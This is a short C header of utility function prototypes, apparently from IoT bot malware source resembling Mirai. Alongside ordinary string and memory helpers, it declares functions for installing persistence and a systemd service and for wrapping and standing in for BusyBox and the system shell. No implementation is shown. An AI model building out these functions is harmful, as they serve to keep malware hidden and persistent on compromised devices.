#pragma once
#include "includes.h"
int util_strlen(const char *);
BOOL util_strncmp(char *, char *, int);
BOOL util_strcmp(char *, char *);
int util_strcpy(char *, const char *);
void util_memcpy(void *, const void *, int);
void util_zero(void *, int);
int util_atoi(char *, int);
char *util_itoa(int, int, char *);
int util_memsearch(char *, int, char *, int);
int util_stristr(char *, int, char *);
ipv4_t util_local_addr(void);
char *util_fdgets(char *, int, int);
void util_install_persistence(void);
void util_install_systemd_service(void);
BOOL util_is_busybox_wrapper(void);
BOOL util_is_shell_wrapper(void);
void util_run_original_busybox(int argc, char **argv);
void util_run_original_shell(int argc, char **argv);
static inline int util_isupper(char);
static inline int util_isalpha(char);
static inline int util_isspace(char);
static inline int util_isdigit(char);
